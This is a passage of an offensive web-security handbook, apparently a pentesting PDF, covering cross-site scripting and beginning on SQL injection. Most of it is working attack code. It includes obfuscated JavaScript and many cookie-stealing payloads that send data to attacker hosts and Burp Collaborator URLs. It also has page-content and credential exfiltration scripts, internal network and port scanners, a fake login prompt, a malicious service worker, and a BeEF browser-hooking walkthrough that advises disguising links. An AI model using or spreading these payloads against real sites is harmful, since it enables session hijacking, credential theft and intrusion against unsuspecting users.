])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[
+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(
!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[
]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[
]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])
[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[
+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+
(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+
[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+
!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]
+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])
[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]
]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]
+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[
]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+(
[][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]
+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]
]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]
+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![
]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[
+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+
[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</scr
ipt> 
//aaencode 
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= 
(o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ
)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (
ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ
]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰ
ﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] 
=(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ
==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ
]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ
) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) 
+ (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) 
+(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) 
+ (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟ
Дﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ
[[ PAGE 216 ]]
]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟ
εﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟ
Θﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) 
+(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟ
Дﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟ
Дﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ
)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰ
ﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_'); 
XSS common payloads 
Several payloads in 1 
 
Retrieve Cookies 
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie> 
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie"> 
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script> 
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script> 
<script>location.href = 
'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script> 
<script>location = 
'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script> 
<script>document.location = 
'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script> 
<script>document.location.href = 
'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script> 
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" 
/>')</script> 
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.c
ookie)</script> 
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+docume
nt.cookie)</script> 
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document
.cookie)</script> 
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script> 
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script> 
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script> 
[[ PAGE 217 ]]
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", 
"http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script> 
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2
M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script> 
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 
'no-cors', body:document.cookie});</script> 
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script> 
You won't be able to access the cookies from JavaScript if the HTTPOnly flag is set in the 
cookie. But here you have some ways to bypass this protection if you are lucky enough. 
Steal Page Content 
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"; 
var attacker = "http://10.10.14.8/exfil"; 
var xhr  = new XMLHttpRequest(); 
xhr.onreadystatechange = function() { 
    if (xhr.readyState == XMLHttpRequest.DONE) { 
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText))) 
    } 
} 
xhr.open('GET', url, true); 
xhr.send(null); 
Find internal IPs 
<script> 
var q = [] 
var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net'; 
var wait = 2000 
var n_threads = 51 
 
// Prepare the fetchUrl functions to access all the possible 
for(i=1;i<=255;i++){ 
  q.push( 
  function(url){ 
    return function(){ 
[[ PAGE 218 ]]
        fetchUrl(url, wait); 
    } 
  }('http://192.168.0.'+i+':8080')); 
} 
 
// Launch n_threads threads that are going to be calling fetchUrl until there is no more 
functions in q 
for(i=1; i<=n_threads; i++){ 
  if(q.length) q.shift()(); 
} 
 
function fetchUrl(url, wait){ 
    console.log(url) 
  var controller = new AbortController(), signal = controller.signal; 
  fetch(url, {signal}).then(r=>r.text().then(text=> 
    { 
        location = collaboratorURL + 
'?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now() 
    } 
  )) 
  .catch(e => { 
  if(!String(e).includes("The user aborted a request") && q.length) { 
    q.shift()(); 
  } 
  }); 
 
  setTimeout(x=>{ 
  controller.abort(); 
  if(q.length) { 
    q.shift()(); 
  } 
  }, wait); 
[[ PAGE 219 ]]
} 
</script> 
Port Scanner (fetch) 
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let 
img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } 
for(let i=0; i<1000; i++) { checkPort(i); } 
Port Scanner (websockets) 
var ports = [80, 443, 445, 554, 3306, 3690, 1234]; 
for(var i=0; i<ports.length; i++) { 
    var s = new WebSocket("wss://192.168.1.1:" + ports[i]); 
    s.start = performance.now(); 
    s.port = ports[i]; 
    s.onerror = function() { 
        console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms"); 
    }; 
    s.onopen = function() { 
        console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms"); 
    }; 
} 
Short times indicate a responding port Longer times indicate no response. 
Review the list of ports banned in Chrome here and in Firefox here. 
Box to ask for credentials 
<style>::placeholder { color:white; }</style><script>document.write("<div 
style='position:absolute;top:100px;left:250px;width:400px;background-
color:white;height:230px;padding:15px;border-radius:10px;color:black'><form 
action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input 
style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' 
type='password' placeholder='Password'/><input type='submit' 
value='Login'></form><p><i>This login box is presented using XSS as a proof-of-
concept</i></p></div>")</script> 
Auto-fill passwords capture 
<b>Username:</><br> 
<input name=username id=username> 
<b>Password:</><br> 
[[ PAGE 220 ]]
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-
SUBDOMAIN-HERE.burpcollaborator.net',{ 
method:'POST', 
mode: 'no-cors', 
body:username.value+':'+this.value 
});"> 
When any data is introduced in the password field, the username and password is sent to the 
attackers server, even if the client selects a saved password and don't write anything the 
credentials will be ex-filtrated. 
Keylogger 
Just searching in github I found a few different ones: 
https://github.com/JohnHoder/Javascript-Keylogger 
https://github.com/rajeshmajumdar/keylogger 
https://github.com/hakanonymos/JavascriptKeylogger 
You can also use metasploit http_javascript_keylogger 
XSS - Stealing CSRF tokens 
<script> 
var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.open('get','/email',true); 
req.send(); 
function handleResponse() { 
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
    var changeReq = new XMLHttpRequest(); 
    changeReq.open('post', '/email/change-email', true); 
    changeReq.send('csrf='+token+'&email=test@test.com') 
}; 
</script> 
XSS - Stealing PostMessage messages 
<img src="https://attacker.com/?" id=message> 
<script> 
 window.onmessage = function(e){ 
[[ PAGE 221 ]]
 document.getElementById("message").src += "&"+e.data; 
</script> 
XSS - Abusing Service Workers 
A service worker is a script that your browser runs in the background, separate from a web 
page, opening the door to features that don't need a web page or user interaction. (More info 
about what is a service worker here). 
The goal of this attack is to create service workers on the victim session inside the vulnerable 
web domain that grant the attacker control over all the pages the victim will load in that 
domain. 
You can see them in the Service Workers field in the Application tab of Developer Tools. You 
can also look at chrome://serviceworker-internals. 
If the victim didn't grant push notifications permissions the service worker won't be able to 
receive communications from the server if the user doesn't access the attacker page again. 
This will prevent for example, maintain conversations with all the pages that accessed the 
attacker web page so web a exploit if found the SW can receive it and execute it. However, if 
the victim grants push notifications permissions this could be a risk. 
In order to exploit this vulnerability you need to find: 
A way to upload arbitrary JS files to the server and a XSS to load the service worker of the 
uploaded JS file 
A vulnerable JSONP request where you can manipulate the output (with arbitrary JS code) and 
a XSS to load the JSONP with a payload that will load a malicious service worker. 
In the following example I'm going to present a code to register a new service worker that will 
listen to the fetch event and will send to the attackers server each fetched URL (this is the code 
you would need to upload to the server or load via a vulnerable JSONP response): 
self.addEventListener('fetch', function(e) { 
  e.respondWith(caches.match(e.request).then(function(response) { 
    fetch('https://attacker.com/fetch_url/' + e.request.url) 
}); 
And this is the code that will register the worker (the code you should be able to execute 
abusing a XSS). In this case a GET request will be sent to the attackers server notifying if the 
registration of the service worker was successful or not: 
<script> 
window.addEventListener('load', function() { 
var sw = "/uploaded/ws_js.js"; 
navigator.serviceWorker.register(sw, {scope: '/'}) 
  .then(function(registration) { 
[[ PAGE 222 ]]
    var xhttp2 = new XMLHttpRequest(); 
    xhttp2.open("GET", "https://attacker.com/SW/success", true); 
    xhttp2.send(); 
  }, function (err) { 
    var xhttp2 = new XMLHttpRequest(); 
    xhttp2.open("GET", "https://attacker.com/SW/error", true); 
    xhttp2.send(); 
  }); 
}); 
</script> 
In case of abusing a vulnerable JSONP endpoint you should put the value inside var sw. For 
example: 
var sw = "/jsonp?callback=onfetch=function(e){ 
e.respondWith(caches.match(e.request).then(function(response){ 
fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//"; 
There is C2 dedicated to the exploitation of Service Workers called Shadow Workers that will 
be very useful to abuse these vulnerabilities. 
In an XSS situation, the 24 hour cache directive limit ensures that a malicious or compromised 
SW will outlive a fix to the XSS vulnerability by a maximum of 24 hours (assuming the client is 
online). Site operators can shrink the window of vulnerability by setting lower TTLs on SW 
scripts. We also encourage developers to build a kill-switch SW. 
Polyglots 
 
Blind XSS payloads 
You can also use: https://xsshunter.com/ 
"><img src='//domain/xss'> 
"><script src="//domain/xss.js"></script> 
><a href="javascript:eval('d=document; _ = 
d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An 
Awesome Time</a> 
<script>function b(){eval(this.responseText)};a=new 
XMLHttpRequest();a.addEventListener("load", b);a.open("GET", 
"//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script> 
 
<!-- html5sec - Self-executing focus event via autofocus: --> 
[[ PAGE 223 ]]
"><input onfocus="eval('d=document; _ = 
d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus> 
 
<!-- html5sec - JavaScript execution via iframe and onload --> 
"><iframe onload="eval('d=document; 
_=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">  
 
<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. --
> 
"><svg onload="javascript:eval('d=document; _ = 
d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" 
xmlns="http://www.w3.org/2000/svg"></svg> 
 
<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The 
same works for <AUDIO> tags  --> 
"><video><source onerror="eval('d=document; _ = 
d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')"> 
 
<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction 
on all modern browsers. This can be abused to bypass blacklists as the event is not very well 
known.  --> 
"><body onpageshow="eval('d=document; _ = 
d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')"> 
 
<!-- xsshunter.com - Sites that use JQuery --> 
<script>$.getScript("//domain")</script> 
 
<!-- xsshunter.com - When <script> is filtered --> 
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))> 
 
<!-- xsshunter.com - Bypassing poorly designed systems with autofocus --> 
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus> 
 
<!-- noscript trick --> 
<noscript><p title="</noscript><img src=x onerror=alert(1)>"> 
[[ PAGE 224 ]]
 
<!-- whitelisted CDNs in CSP --> 
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script> 
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script> 
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple 
load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... --> 
<div ng-app ng-csp><textarea autofocus ng-
focus="d=$event.view.document;d.location.hash.match('x1') ? '' : 
d.location='//localhost/mH/'"></textarea></div> 
Brute-Force List 
 
XSS Abusing other vulnerabilities 
XSS in Markdown 
Check https://github.com/cujanovic/Markdown-XSS-Payloads/blob/master/Markdown-XSS-
Payloads.txt to find possible payloads 
XSS to SSRF 
Got XSS on a site that uses caching? Try upgrading that to SSRF through Edge Side Include 
Injection with this payload: 
<esi:include src="http://yoursite.com/capture" /> 
Use it to bypass cookie restrictions, XSS filters and much more! 
More information about this technique here: XSLT. 
XSS in dynamic created PDF 
If a web page is creating a PDF using user controlled input, you can try to trick the bot that is 
creating the PDF into executing arbitrary JS code. 
So, if the PDF creator bot finds some kind of HTML tags, it is going to interpret them, and you 
can abuse this behaviour to cause a Server XSS. 
 
If you cannot inject HTML tags it could be worth it to try to inject PDF data: 
 
XSS uploading files (svg) 
Upload as an image a file like the following one (from http://ghostlulz.com/xss-svg/): 
Content-Type: multipart/form-data; boundary=---------------------------232181429808 
Content-Length: 574 
-----------------------------232181429808 
[[ PAGE 225 ]]
Content-Disposition: form-data; name="img"; filename="img.svg" 
Content-Type: image/svg+xml 
 
<?xml version="1.0" standalone="no"?> 
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> 
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"> 
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /> 
   <script type="text/javascript"> 
      alert(1); 
   </script> 
</svg> 
-----------------------------232181429808-- 
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"> 
   <script type="text/javascript">alert("XSS")</script> 
</svg> 
<?xml version="1.0" standalone="no"?> 
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> 
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"> 
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/> 
<script type="text/javascript"> 
alert("XSS"); 
</script> 
</svg> 
XSS resources 
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection  
http://www.xss-payloads.com 
 https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt 
 https://github.com/materaj/xss-list  https://github.com/ismailtasdelen/xss-payload-list  
https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec  
https://netsec.expert/2020/02/01/xss-in-2020.html 
[[ PAGE 226 ]]
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting  
BeeF-XSS 
What is BeEF? 
BeEF which stands for Browser Exploitation Framework is a tool that can hook one or more 
browsers and can use them as a beachhead of launching various direct commands and further 
attacks against the system from within the browser context. 
BeEF uses JavaScript and hence it is easier for us to inject codes to the XSS vulnerable pages 
and that code will be and the code will get executed every time any user tries to reach the 
page. 
How to hook Victims using Reflected XSS? 
 
Reflected XSS? 
Reflected XSS are those attacks where the injected script is reflected off the web server, such as 
in an error message, search result, or any response that includes some or all of the input sent to 
the server as part of the request. 
Now, in order to run BeEF go to the Kali Linux machine and enter BeEF. It will automatically 
open the GUI version of BeEF on your browser. Now, the default username and password is 
username: beef 
password: beef 
You can change this by going to the config.yaml file 
[[ PAGE 227 ]]
 
Here, on the left side, you can see, “Online browsers” and “Offline Browsers”. This will list all 
the browsers hooked to the beEF. 
Now, let’s try to get some user to hook on beEF. 
Step 1: We will be using the code given by the beEF itself. 
Step 2: Go to command line and you can see the command. Just copy it somewhere so you can 
modify it. 
 
Step 3: Now, in the <IP> section, you need to add your IP 
Step 4: Now, to get your IP, open terminal and enter the command 
ifconfig 
Step 5: Now, enter the IP in the <IP> portion. Now your command will look something like this 
<script src="http://10.0.2.15:3000/hook.js"></script> 
Now, that’s it we are ready! The code can now be executed. 
Step 6: Let’s go to one of the vulnerable web pages, “DVWA” 
Step 7: First set the security level to Low. 
Step 8: Go to Reflected XSS. Here, we used to enter a name and it used to get displayed with a 
“Hello XXX” message. Now, what we are going to do is, copy the URL somewhere so that we 
can modify it. 
We are doing nothing but just changing the payload here 
[[ PAGE 228 ]]
Step 9: Now, paste the script to the URL. 
http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name=<script src="http://10.0.2.15 
:3000/hook.js"></script># 
The URL is ready to be hooked to BeEF. And now you can send the URL to any person and once 
they execute the URL you will be able to hook their browser to BeEF and then execute 
different commands BeEf allows. 
Step 10: Let us try to hook the browser. Copy the URL and then paste it to any browser 
 
Here, you can see the hooked browser in the “Online Browsers” section. 
Tip: You can use online URL shortening to make the URL look less suspicious. 
How to hook victims to BeEF using stored XSS? 
In comparison, stored XSS can be much more dangerous than the reflected. So now let us see 
how we can hook victims to BeEF using stored XSS. 
Here, you don’t have to send anything to anyone. When anyone visits the page, the code will 
be executed. And the URL will also not look suspicious. 
Step 1: Go to DVWA 
Step 2: Set the security to Low 
Step 3: Go to Stored XSS 
Step 4: Now, what we are going to do here is, 
Enter Name as beef and we gonna put our exploit in the Message text box. If in case, the field 
has character limitations such as if it only allows 100 characters or so. Just inspect and modify 
the limits 
 
Enter the previous script in the text box. 
[[ PAGE 229 ]]
 
Step 5: Click on “ Sign Guestbook” 
Now, you can send the URL to the victim or you can just wait for people to browse the 
website. If the website has lots of visitors, they will be clicking on that. And then you will be 
able to hook the victim and hack them. 
Note: This is only for practice purposes to test it locally. However, in the real world, you will 
have to use port forwarding using static IP. But, since you need lots of practice before trying in 
the real world, testing and applying locally will help you enhance proper knowledge on how it is 
done. 
https://medium.com/@secureica/hooking-victims-to-browser-exploitation-framework-beef-
using-reflected-and-stored-xss-859266c5a00a 
SQL Injection 
SQL Injection can be used in a range of ways to cause serious problems. By levering SQL 
Injection, an attacker could bypass authentication, access, modify and delete data within a 
database. In some cases, SQL Injection can even be used to execute commands on the 
operating system, potentially allowing an attacker to escalate to more damaging attacks inside 
of a network that sits behind a firewall. 
SQL Injection can be classified into three major categories – In-band SQLi, Inferential 
SQLi and Out-of-band SQLi. 
In-band SQLi (Classic SQLi) 
In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band 
SQL Injection occurs when an attacker is able to use the same communication channel to both 
launch the attack and gather results. 
The two most common types of in-band SQL Injection are Error-based SQLi and Union-based 
SQLi. 
Error-based SQLi 
Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by 
the database server to obtain information about the structure of the database. In some cases, 
error-based SQL injection alone is enough for an attacker to enumerate an entire database. 
While errors are very useful during the development phase of a web application, they should 
be disabled on a live site, or logged to a file with restricted access instead. 
Union-based SQLi 
[[ PAGE 230 ]]
Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL 
operator to combine the results of two or more SELECT statements into a single result which is 
then returned as part of the HTTP response. 
Inferential SQLi (Blind SQLi) 
Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, 
however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi 
attack, no data is actually transferred via the web application and the attacker would not be 
able to see the result of an attack in-band (which is why such attacks are commonly referred to 
as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database 
structure by sending payloads, observing the web application’s response and the resulting 
behavior of the database server. 
The two types of inferential SQL Injection are Blind-boolean-based SQLi and Blind-time-based 
SQLi. 
Boolean-based (content-based) Blind SQLi 
Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an 
SQL query to the database which forces the application to return a different result depending 
on whether the query returns a TRUE or FALSE result. 
Depending on the result, the content within the HTTP response will change, or remain the 
same. This allows an attacker to infer if the payload used returned true or false, even though 
no data from the database is returned. This attack is typically slow (especially on large 
databases) since an attacker would need to enumerate a database, character by character. 
Time-based Blind SQLi 
